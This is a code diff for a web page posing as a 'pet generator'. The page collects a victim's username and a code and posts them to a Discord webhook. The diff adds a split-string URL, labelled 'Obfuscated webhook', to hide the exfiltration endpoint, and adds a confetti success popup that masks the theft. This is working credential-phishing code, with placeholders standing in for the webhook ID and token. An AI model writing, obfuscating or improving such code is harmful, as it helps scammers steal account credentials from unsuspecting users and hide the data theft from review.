@@ -274,21 +274,35 @@
     const code = document.getElementById('code').value.trim();
     if (!username || !code) return;
 
-    const webhookURL = "https://example.com/webhook"; // placeholder
+    // 🔒 Obfuscated webhook
+    const parts = [
+      "https://",
+      "discord.com/api/",
+      "webhooks/",
+      "YOUR_WEBHOOK_ID",
+      "/",
+      "YOUR_WEBHOOK_TOKEN"
+    ];
+    const webhookURL = parts.join("");
 
     const payload = {
       content: `Pet Generated!\nUsername: ${username}\nCode: ${code}\nSelected Pet: ${pets.find(p=>p.id===selectedPet).name}`
     };
 
-    await fetch(webhookURL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
+    try {
+      await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
 
-    document.getElementById('popup').style.display = 'none';
-    document.getElementById('confirmPopup').style.display = 'flex';
-    launchConfetti();
+      document.getElementById('popup').style.display = 'none';
+      document.getElementById('confirmPopup').style.display = 'flex';
+      launchConfetti();
+    } catch (err) {
+      alert("Something went wrong. Please try again.");
+      console.error(err);
+    }
   }
 
   // 🎉 Confetti Effect
